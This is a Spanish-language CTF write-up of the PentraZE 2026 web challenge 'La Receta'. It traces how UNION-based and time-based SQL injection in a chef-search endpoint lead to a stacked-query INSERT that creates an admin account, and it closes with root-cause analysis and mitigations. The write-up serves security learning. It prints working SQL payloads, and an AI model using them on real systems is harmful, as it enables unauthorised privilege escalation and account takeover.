---
tipo: laboratorio
Plataforma: Pentraze CTF
Ronda: 2
Fuente: '[[assets/PentraZE-2026-ronda-2/ctf.docx]]'
actualizado: 2026-10-18
tags: [ctf, pentraze, ronda-2, web, easy, sqli, postgresql]
Categoría: Web
Estado: Completado
Dificultad: Easy
Flag: PENTRAZE{fb52e5876c006eeb55b430f8ed6e60256cd212e3fd7d82cbbd5c337f7c044502}
Estado_flag: Documentada en la fuente
Fecha_resolucion: '2026-10-15'
---

- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Easy|Easy]] (Fácil en la fuente)
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Ronda:** [[PentraZE CTF 2026 - Ronda 2|Segunda ronda]]
- **Estado:** Completado

# Writeup - La Receta

> [!info] Objetivo
> Acceder al panel administrativo y recuperar la receta secreta mediante una cuenta admin creada desde la inyección SQL.

## Resumen rápido de la cadena de ataque

1. El JavaScript público señaló el parámetro `sort` del buscador.
2. `UNION` en `q` confirmó cuatro columnas y permitió enumerar PostgreSQL.
3. `pg_sleep()` y sentencias separadas por `;` confirmaron stacked queries en `sort`.
4. La cuenta SQL tenía `INSERT`, aunque carecía de `UPDATE` y `DELETE`.
5. Se copió el hash de una cuenta controlada a un nuevo usuario `admin`.
6. El login legítimo emitió un JWT HS256 administrativo y `/api/admin/flag` devolvió la flag.

## Vulnerabilidades y hallazgos

- [[SQL Injection]]: lectura mediante UNION y escritura mediante stacked queries en parámetros distintos.
- [[PostgreSQL]]: permisos de inserción suficientes para alterar los datos de autorización.
- [[Authentication]]: escalada `member → admin` por manipulación del registro de identidad; no se rompió la firma de [[Cryptography#JWT (JSON Web Tokens)|JWT HS256]].

## Contexto documentado

- **Categoría:** Web
- **Dificultad:** Fácil
- **Estado:** Resuelto
- **Fecha:** 15 de octubre de 2026
- **Tecnologías identificadas:** Node.js, Express, PostgreSQL 15 y JWT
- **Vulnerabilidad:** SQL Injection con ejecución de sentencias apiladas (Stacked Queries)
- **Resultado:** Escalada de privilegios y obtención de la flag

## Paso a paso técnico

### 1. Descripción del desafío

La Receta es una aplicación web donde los usuarios pueden registrarse, iniciar sesión, configurar sus perfiles y buscar otros chefs.

El objetivo del reto era acceder al panel administrativo y recuperar una receta secreta representada mediante una flag.

La aplicación exponía varios endpoints:

```http
POST /api/register
POST /api/login
GET /api/chefs/search
GET /api/admin/flag
```

Este último requería un token JWT válido correspondiente a un usuario con rol admin.

### 2. Reconocimiento inicial

El análisis del código JavaScript público, disponible en /app.js, permitió identificar el funcionamiento del registro, la autenticación y el panel administrativo.

En el código fuente apareció una pista especialmente importante:

```javascript
// Chef search (vulnerable: sort param → /api/chefs/search)
```

La aplicación permitía buscar usuarios y ordenar los resultados mediante tres parámetros:

q: término de búsqueda.

sort: columna utilizada para ordenar.

dir: dirección ascendente o descendente.

Se decidió investigar el endpoint /api/chefs/search.

### 3. Identificación de SQL Injection

Se comprobó una inyección SQL basada en UNION mediante el parámetro q.

Payload:

```sql
x' UNION SELECT NULL,'sqli_confirmada',NULL,0-- -
```

Respuesta obtenida:

```json
{   "chefs": [
    {
      "id": null,
      "username": "sqli_confirmada",
      "display_name": null,
      "recipes_count": 0
    }
  ] }
```

Esto confirmó que la entrada del usuario podía modificar la consulta SQL y que el resultado expuesto contenía cuatro columnas.

También se identificaron las siguientes características de la base de datos:

| Elemento | Resultado |
| --- | --- |
| Motor | PostgreSQL 15.19 |
| Base de datos | la_receta |
| Usuario SQL | app_la_receta |
| Tabla identificada | public.chefs |
| Cuenta administrativa | rtavarez |

La cuenta rtavarez tenía el rol admin, pero su campo password_hash era NULL, por lo que no era posible recuperar una contraseña desde ese registro.

### 4. Investigación de la autenticación

La aplicación utilizaba tokens JWT con el algoritmo HS256.

Un token legítimo de usuario normal contenía información equivalente a:

```json
{
  "username": "chef_test_7391",
  "role": "member"
}
```

Al solicitar /api/admin/flag con un JWT de miembro, el servidor devolvía:

```http
HTTP/1.1 403 Forbidden
```

También se probaron otras técnicas:

Manipulación del campo role durante el registro.

Tokens JWT sin firma mediante alg: none.

Intentos de recuperación de la clave JWT.

Consultas SQL para modificar directamente usuarios.

Ninguna permitió acceder al panel administrativo.

El registro ignoraba el rol admin suministrado por el cliente y creaba usuarios con rol member.

### 5. Descubrimiento de la vulnerabilidad decisiva

La investigación se concentró en el parámetro sort.

Se realizó una prueba temporal utilizando pg_sleep(3):

```sql
(SELECT 1 FROM pg_sleep(3))
```

Resultados observados:

| Prueba | Tiempo |
| --- | --- |
| Consulta normal | 0.141 s |
| Consulta con pg_sleep(3) | 3.181 s |

La diferencia confirmó que la base de datos evaluaba la expresión SQL inyectada.

Posteriormente se investigó si podían ejecutarse varias sentencias separadas por punto y coma.

Payload:

```sql
username; SELECT pg_sleep(2)--
```

Resultado:

```text
HTTP 200 | Tiempo 2.163408s
```

En contraste, una prueba equivalente mediante q devolvió HTTP 500 sin demora significativa.

Hallazgo crítico: el parámetro sort permitía ejecutar sentencias SQL apiladas, abriendo la posibilidad de ejecutar operaciones de escritura.

### 6. Enumeración de privilegios

Se consultaron los permisos de PostgreSQL mediante has_table_privilege().

Resultados:

| Privilegio | Permitido |
| --- | --- |
| SELECT | Sí, demostrado |
| INSERT | Sí |
| UPDATE | No |
| DELETE | No |

Aunque la cuenta de la aplicación no podía actualizar usuarios existentes, sí tenía permiso para insertar nuevos registros en public.chefs.

La estructura relevante de la tabla era:

```text
id             uuid
username       USER-DEFINED
password_hash  text
role           text
display_name   text
bio            text
recipes_count  integer
created_at     timestamptz
```

El campo id disponía de un valor predeterminado generado mediante gen_random_uuid(), mientras que role utilizaba member como valor predeterminado.

Esto permitió plantear una nueva estrategia: insertar un usuario con rol admin, reutilizando el hash de una cuenta cuya contraseña ya conocíamos.

### 7. Explotación: creación de un administrador

Primero se había registrado una cuenta normal:

```text
Usuario: ctf_1792087057
Contraseña: CtfTest2026!
Rol: member
```

Posteriormente se construyó una sentencia SQL para crear una nueva cuenta administrativa copiando el hash de contraseña de ese usuario.

Payload utilizado:

```sql
username;
INSERT INTO public.chefs
    (username, password_hash, role)
SELECT
    'ctf_admin_1792087811',
    password_hash,
    'admin'
FROM public.chefs
WHERE username = 'ctf_1792087057';
--
```

La inyección se envió a través del parámetro sort de /api/chefs/search.

La aplicación respondió:

```json
{"chefs":[]}
```

Esta respuesta, por sí sola, no indicaba si la operación había tenido éxito. Por ello, se verificó la existencia de la nueva cuenta mediante otra consulta SQL.

Resultado:

```json
{   "chefs": [
    {
      "id": null,
      "username": "admin",
      "display_name": null,
      "recipes_count": 0
    }
  ] }
```

La respuesta confirmó que el registro insertado tenía rol administrativo.

La operación no requirió conocer la contraseña del administrador original, descifrar un hash ni modificar la clave de firma JWT.

### 8. Autenticación administrativa

A continuación se inició sesión utilizando las credenciales de la cuenta creada:

```http
POST /api/login
Content-Type: application/json
```

Cuerpo:

```json
{
  "username": "ctf_admin_1792087811",
  "password": "CtfTest2026!"
}
```

Respuesta observada:

```json
{
  "username": "ctf_admin_1792087811",
  "role": "admin",
  "token": "<JWT_VALIDO>"
}
```

El servidor generó un JWT administrativo legítimo porque la cuenta existía en la base de datos, tenía rol admin y utilizaba un hash correspondiente a la contraseña suministrada.

### 9. Obtención de la flag

Finalmente, se envió el token administrativo al endpoint protegido:

```http
GET /api/admin/flag
Authorization: Bearer <JWT_VALIDO>
```

Respuesta:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "flag": "PENTRAZE{fb52e5876c006eeb55b430f8ed6e60256cd212e3fd7d82cbbd5c337f7c044502}"
}
```

FLAG OBTENIDA

```text
PENTRAZE{fb52e5876c006eeb55b430f8ed6e60256cd212e3fd7d82cbbd5c337f7c044502}
```

### 10. Causa raíz y recomendaciones

El ataque fue posible por la combinación de tres condiciones:

El parámetro sort era incorporado a una consulta SQL sin una validación suficientemente restrictiva.

La ejecución de sentencias apiladas permitió pasar de una consulta de lectura a una operación INSERT.

La cuenta PostgreSQL utilizada por la aplicación disponía de privilegios para insertar registros en una tabla que almacenaba información de autenticación y autorización.

La explotación provocó una escalada de privilegios de member a admin.

Para corregir esta clase de vulnerabilidades se recomienda validar sort mediante una lista explícita de columnas permitidas, parametrizar los valores SQL, restringir los permisos de las cuentas de base de datos y separar los privilegios de lectura de los de administración de usuarios.

La protección JWT funcionó al rechazar tokens inválidos, pero no pudo impedir el ataque una vez que el atacante consiguió crear una cuenta administrativa válida en la base de datos.

### 11. Conclusión

El reto La Receta demostró cómo una SQL Injection aparentemente limitada a una función de búsqueda puede convertirse en una escalada completa de privilegios.

El descubrimiento decisivo no fue obtener la contraseña del administrador ni vulnerar la firma JWT, sino identificar que el parámetro sort permitía sentencias apiladas y que la cuenta PostgreSQL poseía permisos INSERT.

Reutilizando el hash de una cuenta controlada, fue posible crear un usuario administrativo, iniciar sesión y recuperar la flag.

Resultado final: reto completado satisfactoriamente.


## Flag

```text
PENTRAZE{fb52e5876c006eeb55b430f8ed6e60256cd212e3fd7d82cbbd5c337f7c044502}
```

## Lecciones aprendidas y mitigar

- Enumerar permisos concretos evita abandonar la investigación por un `UPDATE` denegado: `INSERT` puede bastar.
- Una respuesta vacía del buscador no prueba una escritura; se verificó el rol y luego el login.
- Parametrizar valores, usar listas de columnas permitidas para `sort`/`dir` y separar privilegios de consulta y gestión de identidades.
- La integridad del JWT no compensa una base de datos de identidades manipulable. Aplicar [[3- Principio de privilegio mínimo]].

## Evidencia y revisión documental

El Word no aporta un script completo de automatización ni la consulta exacta que produjo cada tabla de enumeración; se conservan los payloads y resultados disponibles. `<JWT_VALIDO>` es el marcador original, no un token recuperado.

Fuente conservada: [[assets/PentraZE-2026-ronda-2/ctf.docx|ctf.docx original]]. Las descripciones, pruebas, payloads y salidas anteriores proceden de ese documento; no se han reejecutado. Las relaciones y mitigaciones adicionales son síntesis editorial. El Word no contiene imágenes incrustadas.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🏠 MOC: [[PentraZE CTF 2026 - MOC]]
- 🗂️ Ronda: [[PentraZE CTF 2026 - Ronda 2]]
- 🗂️ Categoría: [[CTF - Web]]
- ➡️ Siguiente: [[Writeup - Lives 9, Backups 0]]

## Relacionadas

- [[Writeup - Factura Fantasma]] — reutiliza la enumeración por UNION; allí se extraía una flag en MariaDB, aquí los permisos de PostgreSQL permitieron crear una identidad privilegiada.
- [[Writeup - Pentra CMS]] — ambos alcanzan administración a través del origen de las credenciales/roles; Pentra CMS expone backups y La Receta modifica datos mediante SQL.
- [[Writeup - SoftDat Technology]] — contrasta un JWT expuesto en el cliente con un JWT correctamente firmado emitido después de alterar el rol en la base de datos.
- [[SQL]] — sintaxis de `SELECT`, `INSERT INTO` y `ORDER BY` aplicada en el reto.
- [[Leer el código fuente - view-source, desminificado y señuelos]] — descubrir endpoints y pistas del frontend.
